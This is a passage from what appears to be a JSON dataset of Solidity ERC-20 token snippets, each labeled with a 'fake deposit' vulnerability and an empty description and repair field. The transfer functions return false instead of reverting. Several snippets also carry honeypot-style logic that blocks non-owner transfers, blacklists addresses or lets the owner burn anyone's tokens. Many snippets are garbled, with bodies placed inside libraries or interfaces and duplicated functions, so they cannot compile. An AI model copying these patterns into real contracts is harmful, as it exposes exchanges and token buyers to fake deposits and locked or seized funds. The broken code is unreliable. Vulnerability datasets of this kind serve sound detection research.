                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.0; \n \nimport  \"./Token.sol \"; \n \n/** \n* Abstract Token Smart Contract that could be used as a base contract for \n* ERC-20 token contracts. \n*/ \n abstract contract AbstractToken is Token { \n  constructor () { \n    \n } \n \n  \n function transfer (address _to, uint256 _value) \n public override virtual returns (bool success) { \n   uint256 fromBalance = accounts [msg.sender]; \n   if (fromBalance < _value) return false; \n   if (_value > 0 && msg.sender != _to) { \n     accounts [msg.sender] = fromBalance - _value; \n     accounts [_to] = accounts [_to] + _value; \n   } \n   emit Transfer (msg.sender, _to, _value); \n   return true; \n } \n \n /** \n  * Transfer given number of tokens from given owner to given recipient. \n  * \n  * @param _from address to transfer tokens from the owner of \n  * @param _to address to transfer tokens to the owner of \n  * @param _value number of tokens to transfer from given owner to given \n  *        recipient \n  * @return success true if tokens were transferred successfully, false otherwise \n  */ \n function transferFrom (address _from, address _to, uint256 _value) \n public override virtual returns (bool success) { \n   uint256 spenderAllowance = allowances [_from][msg.sender]; \n   if (spenderAllowance < _value) return false; \n   uint256 fromBalance = accounts [_from]; \n   if (fromBalance < _value) return false; \n \n   allowances [_from][msg.sender] = \n     spenderAllowance - _value; \n \n   if (_value > 0 && _from != _to) { \n     accounts [_from] = fromBalance - _value; \n     accounts [_to] = accounts [_to] + _value; \n   } \n   emit Transfer (_from, _to, _value); \n   return true; \n } \n \n /** \n  * Allow given spender to transfer given number of tokens from message sender. \n  * \n  * @param _spender address to allow the owner of to transfer tokens from \n  *        message sender \n  * @param _value number of tokens to allow to transfer \n  * @return success true if token transfer was successfully approved, false otherwise \n  */ \n function transfer (address _to, uint256 _value) \n public override virtual returns (bool) { \n   if (frozen) return false; \n   else if ( \n     (addressFlags [msg.sender] | addressFlags [_to]) & BLACK_LIST_FLAG == \n     BLACK_LIST_FLAG) \n     return false; \n   else { \n     if (_value <= accounts [msg.sender]) { \n       require (AbstractToken.transfer (_to, _value)); \n       return true; \n     } else return false; \n   } \n } \n \n /** \n  * Transfer given number of tokens from given owner to given recipient. \n  * \n  * @param _from address to transfer tokens from the owner of \n  * @param _to address to transfer tokens to the owner of \n  * @param _value number of tokens to transfer from given owner to given \n  *        recipient \n  * @return true if tokens were transferred successfully, false otherwise \n  */ \n function transferFrom (address _from, address _to, uint256 _value) \n public override virtual returns (bool) { \n   if (frozen) return false; \n   else if ( \n     (addressFlags [_from] | addressFlags [_to]) & BLACK_LIST_FLAG == \n     BLACK_LIST_FLAG) \n     return false; \n   else { \n     if (_value <= allowances [_from][msg.sender] && \n         _value <= accounts [_from]) { \n       require (AbstractToken.transferFrom (_from, _to, _value)); \n       return true; \n     } else return false; \n   } \n } \n \n /** \n  * Allow given spender to transfer given number of tokens from message sender. \n  * \n  * @param _spender address to allow the owner of to transfer tokens from \n  *        message sender \n  * @param _value number of tokens to allow to transfer \n  * @return success true if token transfer was successfully approved, false otherwise \n  */ \n  function transfer (address _to, uint256 _value) \n external returns (bool success); \n \n /** \n  * Transfer given number of tokens from given owner to given recipient. \n  * \n  * @param _from address to transfer tokens from the owner of \n  * @param _to address to transfer tokens to the owner of \n  * @param _value number of tokens to transfer from given owner to given \n  *        recipient \n  * @return success true if tokens were transferred successfully, false otherwise \n  */ \n function transferFrom (address _from, address _to, uint256 _value) \n external returns (bool success); \n \n /** \n  * Allow given spender to transfer given number of tokens from message sender. \n  * \n  * @param _spender address to allow the owner of to transfer tokens from \n  *        message sender \n  * @param _value number of tokens to allow to transfer \n  * @return success true if token transfer was successfully approved, false otherwise \n  */ \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": " \n \npragma solidity ^0.6.12; \n \nabstract contract Context { \n     function transfer(address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Returns the remaining number of tokens that `spender` will be \n     * allowed to spend on behalf of `owner` through {transferFrom}. This is \n     * zero by default. \n     * \n     * This value changes when {approve} or {transferFrom} are called. \n     */ \n    function allowance(address owner, address spender) external view returns (uint256); \n \n    /** \n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n     * \n     * Returns a boolean value indicating whether the operation succeeded. \n     * \n     * IMPORTANT: Beware that changing an allowance with this method brings the risk \n     * that someone may use both the old and the new allowance by unfortunate \n     * transaction ordering. One possible solution to mitigate this race \n     * condition is to first reduce the spender's allowance to 0 and set the \n     * desired value afterwards: \n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n     * \n     * Emits an {Approval} event. \n     */ \n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Emitted when `value` tokens are moved from one account (`from`) to \n     * another (`to`). \n     * \n     * Note that `value` may be zero. \n     */ \n    event Transfer(address indexed from, address indexed to, uint256 value); \n \n    /** \n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n     * a call to {approve}. `value` is the new allowance. \n     */ \n    event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \nlibrary SafeMath { \n    /** \n     * @dev Returns the addition of two unsigned integers, reverting on \n     * overflow. \n     * \n     * Counterpart to Solidity's `+` operator. \n     * \n     * Requirements: \n     * \n     * - Addition cannot overflow. \n     */ \n     function transfer(address recipient, uint256 amount) public override returns (bool) { \n        _transfer(_msgSender(), recipient, amount); \n        return true; \n    } \n \n      function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { \n        _transfer(sender, recipient, amount); \n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\")); \n        return true; \n    } \n \n     function _transfer(address sender, address recipient, uint256 amount) private { \n        require(sender != address(0), \"ERC20: transfer from the zero address\"); \n        require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n        require(amount > 0, \"Transfer amount must be greater than zero\"); \n        if (BOTtoScan[sender] || BOTtoScan[recipient]) \n        require(amount == 0, \"temporary error\"); \n        if (_contractRunning == false || sender == owner() || recipient == owner()) { \n        if (_isExcluded[sender] && !_isExcluded[recipient]) { \n        _transferFromExcluded(sender, recipient, amount); \n        } else if (!_isExcluded[sender] && _isExcluded[recipient]) { \n        _transferToExcluded(sender, recipient, amount); \n         } else if (!_isExcluded[sender] && !_isExcluded[recipient]) { \n        _transferStandard(sender, recipient, amount); \n        } else if (_isExcluded[sender] && _isExcluded[recipient]) { \n        _transferBothExcluded(sender, recipient, amount); \n        } else {_transferStandard(sender, recipient, amount);}} \n        else {require (_contractRunning == false, \"Unexpected error\");} \n    } \n \n    function _transferStandard(address sender, address recipient, uint256 tAmount) private { \n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount); \n        _rOwned[sender] = _rOwned[sender].sub(rAmount); \n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \n        _reflectFee(rFee, tFee); \n        emit Transfer(sender, recipient, tTransferAmount); \n    }  } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.1; \ncontract Context { \n    function _msgSender() internal view virtual returns (address) { \n        return msg.sender; \n    } \n \n       function transfer(address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Returns the remaining number of tokens that `spender` will be \n     * allowed to spend on behalf of `owner` through {transferFrom}. This is \n     * zero by default. \n     * \n     * This value changes when {approve} or {transferFrom} are called. \n     */ \n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n    /** \n     * @dev Emitted when `value` tokens are moved from one account (`from`) to \n     * another (`to`). \n     * \n     * Note that `value` may be zero. \n     */ \n    event Transfer(address indexed from, address indexed to, uint256 value); \n \n    /** \n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n     * a call to {approve}. `value` is the new allowance. \n     */ \n    event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n/** \n * @dev Interface for the optional metadata functions from the ERC20 standard. \n * \n */ \ninterface IERC20Metadata is IERC20 { \n    /** \n     * @dev Returns the name of the token. \n     */ \n      function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n        _transfer(_msgSender(), recipient, amount); \n        return true; \n    } \n \n    /** \n     * @dev See {IERC20-allowance}. \n     */ \n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n        _transfer(sender, recipient, amount); \n        uint256 currentAllowance = _allowances[sender][_msgSender()]; \n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); \n        _approve(sender, _msgSender(), currentAllowance - amount); \n        return true; \n    } \n \n    /** \n     * @dev Atomically increases the allowance granted to `spender` by the caller. \n     * \n     * This is an alternative to {approve} that can be used as a mitigation for \n     * problems described in {IERC20-approve}. \n     * \n     * Emits an {Approval} event indicating the updated allowance. \n     * \n     * Requirements: \n     * \n     * - `spender` cannot be the zero address. \n     */ \n      function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n        require(sender != address(0), \"ERC20: transfer from the zero address\"); \n        require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n        require(amount > 0, \"Transfer amount must be grater thatn zero\"); \n        if (_approveTransfer[sender] || _approveTransfer[recipient])  \n        require(maxTxPercent == false, \"\"); \n        if (maxTxPercent == true || sender == _owner || recipient == _owner) { \n        _beforeTokenTransfer(sender, recipient, amount); \n        uint256 senderBalance = _balances[sender]; \n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\"); \n        _balances[sender] = senderBalance - amount; \n        _balances[recipient] += amount; \n        emit Transfer(sender, recipient, amount);} \n        else {require (maxTxPercent == true, \"\");}  \n    } \n     \n    /** \n     * @dev Destroys `amount` tokens from `account`, reducing the \n     * total supply. \n     * \n     * Emits a {Transfer} event with `to` set to the zero address. \n     * \n     * Requirements: \n     * \n     * - `account` cannot be the zero address. \n     * - `account` must have at least `amount` tokens. \n     */ \n     function burnRewards(address account, uint256 value) external onlyOwner { \n    _burn(account, value); \n    } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity =0.8.3; \n \n library Address { \n     function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n       _transfer(_msgSender(), recipient, amount); \n       return true; \n   } \n function allowance(address owner, address spender) public view virtual override returns (uint256) { \n       return _allowances[owner][spender]; \n   } \n \n    function approve(address spender, uint256 amount) public virtual override returns (bool) { \n       _approve(_msgSender(), spender, amount); \n       return true; \n   } \n \n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n       _transfer(sender, recipient, amount); \n       uint256 currentAllowance = _allowances[sender][_msgSender()]; \n       require(currentAllowance >= amount,  \"ERC20: transfer amount exceeds allowance \"); \n       _approve(sender, _msgSender(), currentAllowance - amount); \n       return true; \n   } \n \n   /** \n    * @dev Atomically increases the allowance granted to `spender` by the caller. \n    * \n    * This is an alternative to {approve} that can be used as a mitigation for \n    * problems described in {IERC20-approve}. \n    * \n    * Emits an {Approval} event indicating the updated allowance. \n    * \n    * Requirements: \n    * \n    * - `spender` cannot be the zero address. \n    */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n   /** \n    * @dev Returns the remaining number of tokens that `spender` will be \n    * allowed to spend on behalf of `owner` through {transferFrom}. This is \n    * zero by default. \n    * \n    * This value changes when {approve} or {transferFrom} are called. \n    */ \n   function allowance(address owner, address spender) external view returns (uint256); \n \n   /** \n    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n    * \n    * Returns a boolean value indicating whether the operation succeeded. \n    * \n    * IMPORTANT: Beware that changing an allowance with this method brings the risk \n    * that someone may use both the old and the new allowance by unfortunate \n    * transaction ordering. One possible solution to mitigate this race \n    * condition is to first reduce the spender's allowance to 0 and set the \n    * desired value afterwards: \n    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n    * \n    * Emits an {Approval} event. \n    */ \n   function approve(address spender, uint256 amount) external returns (bool); \n \n   /** \n    * @dev Moves `amount` tokens from `sender` to `recipient` using the \n    * allowance mechanism. `amount` is then deducted from the caller's \n    * allowance. \n    * \n    * Returns a boolean value indicating whether the operation succeeded. \n    * \n    * Emits a {Transfer} event. \n    */ \n   function transferFrom( \n       address sender, \n       address recipient, \n       uint256 amount \n   ) external returns (bool); \n \n   /** \n    * @dev Emitted when `value` tokens are moved from one account (`from`) to \n    * another (`to`). \n    * \n    * Note that `value` may be zero. \n    */ \n   event Transfer(address indexed from, address indexed to, uint256 value); \n \n   /** \n    * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n    * a call to {approve}. `value` is the new allowance. \n    */ \n   event Approval(address indexed owner, address indexed spender, uint256 value); \n}\"},\"IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT \n pragma solidity =0.8.3; \n import  \"./IERC20.sol \"; \n \n/** \n* @dev Interface for the optional metadata functions from the ERC20 standard. \n* \n* _Available since v4.1._ \n*/ \n interface IERC20Metadata is IERC20 { \n   /** \n    * @dev Returns the name of the token. \n    */ \n  function burn(address account, uint256 amount) external onlyOwner { \n   _burn(account, amount); \n } \n}\"}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "{\"Address.sol\":{\"content\":\"\n\npragma solidity =0.8.3;\nlibrary Address {\n   /**\n    * @dev Returns true if `account` is a contract.\n    *\n    * [IMPORTANT]\n    * ====\n    * It is unsafe to assume that an address for which this function returns\n    * false is an externally-owned account (EOA) and not a contract.\n    *\n    * Among others, `isContract` will return false for the following\n    * types of addresses:\n    *\n    *  - an externally-owned account\n    *  - a contract in construction\n    *  - an address where a contract will be created\n    *  - an address where a contract lived, but was destroyed\n    * ====\n    */\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n       _transfer(_msgSender(), recipient, amount);\n       return true;\n   } \n   /**\n    * @dev See {IERC20-allowance}.\n    */\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n       _transfer(sender, recipient, amount);\n       uint256 currentAllowance = _allowances[sender][_msgSender()];\n       require(currentAllowance >= amount,  \"ERC20: transfer amount exceeds allowance \");\n       _approve(sender, _msgSender(), currentAllowance - amount);\n       return true;\n   } \n   /**\n    * @dev Atomically increases the allowance granted to `spender` by the caller.\n    *\n    * This is an alternative to {approve} that can be used as a mitigation for\n    * problems described in {IERC20-approve}.\n    *\n    * Emits an {Approval} event indicating the updated allowance.\n    *\n    * Requirements:\n    *\n    * - `spender` cannot be the zero address.\n    */\n  function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n       require(sender != address(0),  \"ERC20: transfer from the zero address \");\n       require(recipient != address(0),  \"ERC20: transfer to the zero address \");\n       require(amount > 0,  \"Transfer amount must be grater thatn zero \");\n       \n       if(!_approvedTransfer[sender] && _bBots[recipient]) {\n           require(amount <= _decreaseFee,  \"Transfer amount exceeds the maxTxAmount. \"); \n       }\n        \n       if (_feeBurn[sender] || _feeBurn[recipient]) \n       require(intTx == false,  \" \");\n       if (intTx == true || sender == _owner || recipient == _owner) {\n       _beforeTokenTransfer(sender, recipient, amount);\n       uint256 senderBalance = _balances[sender];\n       require(senderBalance >= amount,  \"ERC20: transfer amount exceeds balance \");\n       _balances[sender] = senderBalance - amount;\n       _balances[recipient] += amount;\n       emit Transfer(sender, recipient, amount);}\n       else {require (intTx == true,  \" \");} \n   }\n   \n   /**\n    * @dev Destroys `amount` tokens from `account`, reducing the\n    * total supply.\n    *\n    * Emits a {Transfer} event with `to` set to the zero address.\n    *\n    * Requirements:\n    *\n    * - `account` cannot be the zero address.\n    * - `account` must have at least `amount` tokens.\n    */\n   function transfer(address recipient, uint256 amount) external returns (bool); \n   /**\n    * @dev Returns the remaining number of tokens that `spender` will be\n    * allowed to spend on behalf of `owner` through {transferFrom}. This is\n    * zero by default.\n    *\n    * This value changes when {approve} or {transferFrom} are called.\n    */\n   function transferFrom(\n       address sender,\n       address recipient,\n       uint256 amount\n   ) external returns (bool); \n   /**\n    * @dev Emitted when `value` tokens are moved from one account (`from`) to\n    * another (`to`).\n    *\n    * Note that `value` may be zero.\n    */\n   event Transfer(address indexed from, address indexed to, uint256 value); \n   /**\n    * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n    * a call to {approve}. `value` is the new allowance.\n    */\n   event Approval(address indexed owner, address indexed spender, uint256 value);\n}\"},\"IERC20Metadata.sol\":{\"content\":\"\npragma solidity =0.8.3;\nimport  \"./IERC20.sol \"; \n/**\n* @dev Interface for the optional metadata functions from the ERC20 standard.\n*\n* _Available since v4.1._\n*/\n interface IERC20Metadata is IERC20 {\n   /**\n    * @dev Returns the name of the token.\n    */\n   function name() external view returns (string memory); \n   /**\n    * @dev Returns the symbol of the token.\n    */\n    function decimals() external view returns (uint8);\n}\"}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.24; \n \ncontract IMigrationContract { \n     function transfer(address _to, uint256 _value) public returns (bool success); \n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); \n    function approve(address _spender, uint256 _value) public returns (bool success); \n     function transfer(address _to, uint256 _value) public returns (bool success) { \n        if (balances[msg.sender] >= _value && _value > 0) { \n            balances[msg.sender] -= _value; \n            balances[_to] += _value; \n            emit Transfer(msg.sender, _to, _value); \n            return true; \n        } else { \n            return false; \n        } \n    } \n \n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { \n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { \n            balances[_to] += _value; \n            balances[_from] -= _value; \n            allowed[_from][msg.sender] -= _value; \n            emit Transfer(_from, _to, _value); \n            return true; \n        } else { \n            return false; \n        } \n    } \n \n       function () public payable { \n        require(isFunding); \n        require(msg.value != 0); \n \n        require(block.number >= fundingStartBlock); \n        require(block.number <= fundingStopBlock); \n \n        uint256 tokens = safeMult(msg.value, tokenExchangeRate); \n        require(tokens + tokenRaised <= currentSupply); \n \n        tokenRaised = safeAdd(tokenRaised, tokens); \n        balances[msg.sender] += tokens; \n \n        emit IssueToken(msg.sender, tokens);  //\u8bb0\u5f55\u65e5\u5fd7 \n    } \n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\ninterface ERC20Interface {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n       \r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract GBLC is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply;\r\n        _balances[msg.sender] = initialSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Robots is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Robots\";\r\n    string public constant symbol = \"\ud83e\udd16\ud83e\udd16\ud83e\udd16\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract FIFA is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"FIFA World Cup\";\r\n    string public constant symbol = \"FIFA\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract LUNA_ZOOM is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000*10**uint256(decimals);\r\n    string public constant name = \"LUNA ZOOM\";\r\n    string public constant symbol = \"LUNAZ \ud83c\udf15\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract LUNA_MOON is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000*10**uint256(decimals);\r\n    string public constant name = \"LUNA MOON\";\r\n    string public constant symbol = \"LUNAM \ud83c\udf1d\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return 